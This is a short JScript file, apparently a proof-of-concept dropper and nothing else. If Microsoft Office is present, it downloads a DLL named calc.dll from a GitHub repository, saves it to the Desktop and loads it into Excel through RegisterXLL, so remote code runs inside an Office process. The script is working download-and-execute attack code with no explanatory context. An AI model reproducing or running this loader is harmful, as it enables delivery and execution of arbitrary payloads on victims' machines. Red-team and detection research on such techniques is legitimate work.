FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
{   
	
	h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	h.Open("GET","https://github.com/c0mp4s5/test/raw/master/calc.dll",false);
	h.Send();
	s=new ActiveXObject("ADODB.Stream");
	s.Type=1;
	s.Open();
	s.Write(h.ResponseBody);
	x=new ActiveXObject("WScript.Shell").SpecialFolders("Desktop")+"\\calc.dll";
	s.SaveToFile(x,2);	 
	e= new ActiveXObject("Excel.Application");
	e.RegisterXLL(x);
		  
}
